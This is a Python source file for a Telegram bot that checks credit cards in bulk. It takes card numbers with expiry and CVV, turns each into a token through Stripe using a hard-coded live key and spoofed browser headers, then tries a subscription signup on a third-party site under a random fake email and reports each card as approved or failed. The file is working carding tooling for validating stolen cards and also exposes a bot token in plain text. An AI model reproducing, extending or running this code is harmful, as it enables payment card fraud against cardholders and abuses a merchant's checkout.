import re
import time
import random
import string
import requests
from telebot import TeleBot

TOKEN = "7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY"
bot = TeleBot(TOKEN, parse_mode=None)

processing_users = {}

def generate_random_email():
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return f"{username}@gmail.com"

def safe_json_parse(response):
    try:
        return response.json()
    except Exception:
        return None

def process_card(card_data):
    try:
        # Parse card formats
        if '/' in card_data:
            parts = re.split(r'[/|]', card_data)
        else:
            parts = card_data.split('|')
        if len(parts) != 4:
            return "⚠️ Invalid format. Use CC|MM|YY|CVV or CC/MM/YY/CVV"

        cc, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = f"20{yy}"

        # First request to Stripe API to get token
        stripe_url = "https://api.stripe.com/v1/tokens"
        headers = {
            "Host": "api.stripe.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2 Mobile/15E148 Safari/605.1.15"
        }
        data = {
            "guid": "8b1dae8e-b683-4fd4-9220-381abc8df51e598300",
            "muid": "ef66e872-afcd-4596-839e-931e061bffd6cb7483",
            "sid": "e90f7930-ec07-41c9-a61d-4c31960cf6f54de193",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "payment_user_agent": "stripe.js/aa3f8c0487; stripe-js-v3/aa3f8c0487; card-element",
            "key": "pk_live_7ZEzPfBzcpa67c2hVYYKAXdf008kTY3bSa"
        }
        r1 = requests.post(stripe_url, headers=headers, data=data, timeout=15)
        if r1.status_code != 200:
            return f"❌ Stripe token request failed with status {r1.status_code}: {r1.text}"

        token_json = safe_json_parse(r1)
        if not token_json or 'id' not in token_json:
            return f"❌ Invalid Stripe token response: {r1.text}"

        token = token_json['id']
        if not token.startswith('tok_'):
            return f"❌ Failed to get valid token: {r1.text}"

        # Second request to final URL
        final_url = "https://my.playbookapp.io/management/subscription"
        headers2 = {
            "Host": "my.playbookapp.io",
            "Content-Type": "application/json",
            "Origin": "https://my.playbookapp.io",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2 Mobile/15E148 Safari/605.1.15"
        }
        payload = {
            "source": token,
            "user": {"email": generate_random_email()},
            "plan": "playbook_monthly",
            "metadata": {"sourceInfluencerId": 0}
        }
        r2 = requests.post(final_url, headers=headers2, json=payload, timeout=15)
        if r2.status_code != 200:
            return f"❌ Final request failed with status {r2.status_code}: {r2.text}"

        result = safe_json_parse(r2)
        if result is None:
            return f"❌ Failed to parse final response JSON: {r2.text}"

        if result.get("err", False):
            status = "✅ Approved"
        else:
            status = "❌ Failure"
        return f"{status}\nFull response:\n{result}"

    except requests.exceptions.RequestException as e:
        return f"⚠️ Network error: {str(e)}"
    except Exception as e:
        return f"⚠️ Unexpected error: {str(e)}"

@bot.message_handler(commands=['start'])
def start(message):
    instructions = (
        "Send credit cards in these formats:\n"
        "CC|MM|YY|CVV\n"
        "CC|MM|YYYY|CVV\n"
        "CC/MM/YY/CVV\n"
        "CC/MM/YYYY/CVV\n\n"
        "You can send single or multiple cards separated by new lines."
    )
    bot.send_message(message.chat.id, instructions)

@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.chat.id
    processing_users[user_id] = False
    bot.send_message(user_id, "⏹ Processing stopped.")

@bot.message_handler(func=lambda m: True)
def handle_cards(message):
    user_id = message.chat.id
    processing_users[user_id] = True
    cards = message.text.strip().split('\n')

    for i, card in enumerate(cards):
        if not processing_users.get(user_id, True):
            break
        card = card.strip()
        if not card:
            continue
        result = process_card(card)
        bot.send_message(user_id, result)
        if i < len(cards) - 1:
            time.sleep(15)

    processing_users[user_id] = False

if __name__ == "__main__":
    bot.delete_webhook()  # Remove webhook to avoid conflicts
    bot.infinity_polling()